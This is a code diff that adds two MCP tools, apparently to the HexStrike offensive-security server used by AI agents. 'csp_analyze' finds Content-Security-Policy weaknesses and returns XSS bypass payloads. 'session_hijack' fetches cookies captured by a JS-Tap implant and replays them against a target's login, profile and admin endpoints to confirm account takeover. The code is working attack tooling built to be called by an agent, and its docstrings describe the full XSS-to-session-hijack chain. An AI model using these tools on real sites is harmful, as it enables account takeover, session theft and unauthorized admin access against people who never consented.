@@ -6829,6 +6829,187 @@ def setup_mcp_server(hexstrike_client: HexStrikeClient) -> FastMCP:
         )
         return {"output": "\n".join(lines), "data": result}
 
+    # ─────────────────────────────────────────────────────────
+    #  CSP BYPASS ANALYZER TOOL
+    # ─────────────────────────────────────────────────────────
+    @mcp.tool()
+    def csp_analyze(
+        url: str,
+        raw_csp: str = "",
+    ) -> Dict[str, Any]:
+        """
+        Fetch and analyze the Content-Security-Policy header for a target URL.
+        Identifies every exploitable weakness and returns specific bypass payloads.
+
+        Run this BEFORE dalfox_xss_chain to determine whether XSS injection is
+        feasible and which payload type is most likely to bypass the policy.
+
+        Weaknesses detected:
+          - unsafe-inline / unsafe-eval           → direct injection payloads
+          - Wildcard (*) in script-src            → load from any origin
+          - data: URI in script-src               → base64 inline execution
+          - Trusted CDN bypass (AngularJS/JSONP)  → cdn.jsdelivr, ajax.googleapis, etc.
+          - No script-src / no CSP at all         → completely open
+          - strict-dynamic without nonce/hash     → propagation abuse
+          - Static nonces                         → reuse detection
+          - Missing frame-ancestors               → clickjacking
+          - Unrestricted object-src               → plugin-based bypass
+
+        Args:
+            url:     Target URL to fetch and analyze (e.g. https://example.com)
+            raw_csp: Optional raw CSP string — analyze without fetching the URL
+
+        Returns:
+            injectable flag, parsed directives, findings with bypass payloads per weakness.
+        """
+        resp = requests.post(
+            f"{BASE_URL}/api/tools/csp/analyze",
+            json={"url": url, "raw_csp": raw_csp},
+            timeout=30,
+        )
+        result = resp.json()
+
+        injectable_label = "✅ INJECTABLE" if result.get("injectable") else "🛡️  LIKELY BLOCKED"
+        lines = [
+            f"🔒 CSP Analyzer — {url}",
+            f"   CSP present  : {'Yes' if result.get('csp_present') else 'No'}",
+            f"   Verdict       : {injectable_label}",
+            f"   🚨 CRITICAL   : {result.get('critical', 0)}",
+            f"   🔴 HIGH       : {result.get('high', 0)}",
+            f"   ⏱  Duration   : {result.get('duration_sec', 0)}s",
+            "",
+        ]
+
+        if result.get("csp_header"):
+            lines.append(f"📋 Raw CSP:\n   {result['csp_header'][:300]}")
+            lines.append("")
+
+        sev_icons = {"CRITICAL": "🚨", "HIGH": "🔴", "MEDIUM": "🟡", "INFO": "ℹ️ "}
+        for f in result.get("findings", []):
+            icon = sev_icons.get(f.get("severity", ""), "❓")
+            lines.append(f"{icon} [{f['severity']}] {f['weakness']}  (directive: {f.get('directive', '?')})")
+            lines.append(f"   {f.get('description', '')}")
+            payloads = f.get("bypass_payloads", [])
+            if payloads:
+                lines.append("   Payloads:")
+                for p in payloads[:3]:
+                    lines.append(f"     → {p}")
+            lines.append("")
+
+        logger.info(
+            f"{HexStrikeColors.SUCCESS}🔒 CSP Analyzer: {result.get('total_findings', 0)} findings — "
+            f"{'INJECTABLE' if result.get('injectable') else 'BLOCKED'} on {url}{HexStrikeColors.RESET}"
+        )
+        return {"output": "\n".join(lines), "data": result}
+
+    # ─────────────────────────────────────────────────────────
+    #  SESSION HIJACK VALIDATOR TOOL
+    # ─────────────────────────────────────────────────────────
+    @mcp.tool()
+    def session_hijack(
+        target: str,
+        client_id: str = "",
+        cookies_json: str = "",
+        beacon_url: str = "http://localhost:8444",
+        jstap_username: str = "",
+        jstap_password: str = "",
+        custom_endpoints: str = "",
+    ) -> Dict[str, Any]:
+        """
+        Replay cookies captured by JS-Tap against a target to verify whether
+        the session is still valid, identify the compromised account, and
+        detect admin or elevated-privilege access.
+
+        Closes the full XSS chain:
+          JS-Tap implant → cookie capture → session replay → account verified
+
+        Two ways to supply cookies:
+          1. Provide client_id — cookies are fetched automatically from JS-Tap
+          2. Provide cookies_json — a JSON list of {name, value, domain} dicts
+
+        Probes 22 common auth endpoints including /api/me, /profile,
+        /dashboard, /admin, /wp-admin, and WordPress REST API.
+
+        Args:
+            target:           Target base URL (e.g. https://example.com)
+            client_id:        JS-Tap client ID — fetches cookies automatically
+            cookies_json:     JSON string of cookie list (alternative to client_id)
+            beacon_url:       JS-Tap server URL (default http://localhost:8444)
+            jstap_username:   JS-Tap portal username
+            jstap_password:   JS-Tap portal password
+            custom_endpoints: Comma-separated extra paths to probe
+
+        Returns:
+            session_valid, has_admin_access, discovered_username,
+            list of authenticated endpoints, list of admin endpoints.
+        """
+        import json as _json
+
+        cookies = None
+        if cookies_json:
+            try:
+                cookies = _json.loads(cookies_json)
+            except Exception:
+                cookies = None
+
+        custom_ep_list = [e.strip() for e in custom_endpoints.split(",") if e.strip()] if custom_endpoints else None
+
+        resp = requests.post(
+            f"{BASE_URL}/api/tools/session/hijack",
+            json={
+                "target":          target,
+                "cookies":         cookies,
+                "client_id":       client_id,
+                "beacon_url":      beacon_url,
+                "jstap_username":  jstap_username,
+                "jstap_password":  jstap_password,
+                "custom_endpoints": custom_ep_list,
+            },
+            timeout=120,
+        )
+        result = resp.json()
+
+        valid     = result.get("session_valid", False)
+        is_admin  = result.get("has_admin_access", False)
+        username  = result.get("discovered_username") or "unknown"
+
+        status_line = "🟢 VALID SESSION" if valid else "🔴 SESSION EXPIRED / INVALID"
+        admin_line  = "⚠️  ADMIN ACCESS DETECTED" if is_admin else "👤 Standard user"
+
+        lines = [
+            f"🍪 Session Hijack Validator — {target}",
+            f"   {status_line}",
+            f"   {admin_line}",
+            f"   Account       : {username}",
+            f"   Cookies used  : {result.get('cookies_replayed', 0)}",
+            f"   Endpoints probed: {result.get('endpoints_probed', 0)}",
+            f"   ⏱  Duration   : {result.get('duration_sec', 0)}s",
+            "",
+        ]
+
+        auth_eps = result.get("authenticated_endpoints", [])
+        if auth_eps:
+            lines.append("✅ Authenticated endpoints:")
+            for ep in auth_eps:
+                lines.append(f"   {ep}")
+            lines.append("")
+
+        admin_eps = result.get("admin_endpoints", [])
+        if admin_eps:
+            lines.append("🚨 Admin endpoints accessible:")
+            for ep in admin_eps:
+                lines.append(f"   {ep}")
+            lines.append("")
+
+        if not valid:
+            lines.append("ℹ️  No valid session found — cookies may have expired or target uses server-side invalidation.")
+
+        logger.info(
+            f"{HexStrikeColors.SUCCESS}🍪 Session Hijack: {'VALID' if valid else 'INVALID'} — "
+            f"user={username} admin={is_admin} on {target}{HexStrikeColors.RESET}"
+        )
+        return {"output": "\n".join(lines), "data": result}
+
     return mcp
 
 def parse_args():
